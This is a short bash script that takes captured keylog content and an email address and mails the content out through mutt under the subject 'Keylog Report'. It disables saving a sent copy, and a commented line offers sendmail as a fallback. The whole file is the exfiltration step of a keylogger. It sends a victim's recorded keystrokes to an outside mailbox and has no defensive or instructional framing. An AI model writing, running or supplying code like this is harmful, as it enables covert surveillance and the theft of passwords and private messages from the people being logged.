#!/usr/bin/bash

keylog_content="$1"  # First argument, should be the content or filename to send
email="$2"           # Second argument, recipient's email address

# Check if arguments are provided
if [ -z "$keylog_content" ] || [ -z "$email" ]; then
    echo "Usage: $0 <keylog_content> <email>"
    exit 1
fi

# Use mutt to send the email with keylog content
echo "$email"
echo "$keylog_content" | mutt -e 'set copy=no' -s "Keylog Report" -- "$email"

# echo -e "$keylog_content" | sendmail "$email"
